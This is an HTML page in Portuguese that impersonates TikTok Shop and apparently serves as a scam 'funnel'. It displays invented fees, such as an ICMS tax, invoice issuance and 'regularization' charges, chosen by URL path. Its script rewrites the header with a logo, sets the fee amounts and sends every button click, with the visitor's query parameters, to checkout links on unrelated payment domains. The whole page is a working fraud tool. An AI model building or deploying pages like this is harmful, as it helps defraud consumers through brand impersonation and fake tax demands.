<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TikTok Shop - Sistema de Funis</title>
    <meta name="description" content="Sistema de funis de vendas para rastreamento e cobrança de taxas especiais" />
    
    <style>
      /* Estilo básico para a página não ficar vazia/branca */
      body {
        background-color: #f4f4f4;
        font-family: sans-serif;
        margin: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
      }
      header {
        width: 100%;
        background-color: black;
        padding: 16px 0;
        text-align: center;
        margin-bottom: 20px;
      }
      .container {
        max-width: 600px;
        background: white;
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        text-align: center;
      }
      .btn-checkout {
        background-color: #ff0050;
        color: white;
        border: none;
        padding: 15px 30px;
        font-size: 18px;
        font-weight: bold;
        border-radius: 8px;
        cursor: pointer;
        margin-top: 20px;
      }
      .price-tag {
        font-size: 2rem;
        font-weight: bold;
        color: #15803d;
      }
    </style>
  </head>

  <body>
    <header>
      <div class="container flex items-center">
        <span>TikTok Shop</span>
      </div>
    </header>

    <div id="root">
      <div class="container">
        <h2>Processamento de Taxa</h2>
        <p>Valor a ser pago:</p>
        <span class="font-bold text-2xl price-tag">R$ 0,00</span>
        <p class="text-center text-5xl font-bold text-green-700"></p>
        
        <br>
        <button class="btn-checkout">Pagar o ICMS</button>
      </div>
    </div>

    <script>
      (function(){
        // URL da logo original do seu script
        var url = 'https://d3m889aznlr23d.cloudfront.net/img/events/id/458/458868042/assets/ae82441d2f15b4ef8ceedfb0e5b636ad.Primary-fullcolor-white.png';
        
        function getTargetPrice(){
          var p = window.location.pathname;
          if(p === '/emissao-nf') return 'R$22,00';
          if(p === '/emissao-icms') return 'R$17,01';
          return 'R$ 25,00'; // Valor padrão caso não esteja em uma rota específica
        }

        function getTargetBigPrice(){
          var p = window.location.pathname;
          if(p === '/regularizar') return 'R$ 26,90';
          return null;
        }

        // Links de checkout fornecidos no seu código
        var targetCheckoutUrlICMS = 'https://checkout.indenizatiks.com/VCCL1O8SCS1N';
        var targetCheckoutUrlManuseio = 'https://checkout.indenizatiks.com/VCCL1O8SCS1O';
        var targetCheckoutUrlRegularizar = 'https://checkout.indenizatiks.com/VCCL1O8SCS1P';
        var targetCheckoutUrlImportacao = 'https://checkout.indenizatiks.com/VCCL1O8SCS1Q';
        var targetCheckoutUrlProduct = 'https://pay.safechecktyon.com/xambWcNi';
        var targetCheckoutUrlPix = 'https://pay.safechecktyon.com/BhkkKtms';

        function swapHeaderContent(){
          var headers = document.querySelectorAll('header');
          headers.forEach(function(header){
            var container = header.querySelector('.container');
            if(container){
                var img = document.createElement('img');
                img.src = url;
                img.style.height = '60px';
                container.innerHTML = '';
                container.appendChild(img);
            }
          });
        }

        function swapPriceValue(){
          var target = getTargetPrice();
          var spans = document.querySelectorAll('span.font-bold.text-2xl');
          spans.forEach(function(sp){
              sp.textContent = target;
          });
        }

        function overrideCheckoutButton(){
          var buttons = document.querySelectorAll('button');
          buttons.forEach(function(btn){
            var txt = (btn.textContent||'').trim();
            var path = window.location.pathname;

            btn.addEventListener('click', function(ev){
                ev.preventDefault();
                var q = window.location.search || '';
                
                // Lógica de redirecionamento baseada no seu script
                if(path === '/emissao-icms' || txt.includes('Pagar o ICMS')) {
                  window.location.href = targetCheckoutUrlICMS + q;
                } else if(path === '/manuseio') {
                  window.location.href = targetCheckoutUrlManuseio + q;
                } else if(path === '/regularizar') {
                  window.location.href = targetCheckoutUrlRegularizar + q;
                } else {
                  window.location.href = targetCheckoutUrlPix + q;
                }
            });
          });
        }

        window.onload = function() {
          swapHeaderContent();
          swapPriceValue();
          overrideCheckoutButton();
        };
      })();
    </script>
  </body>
</html>
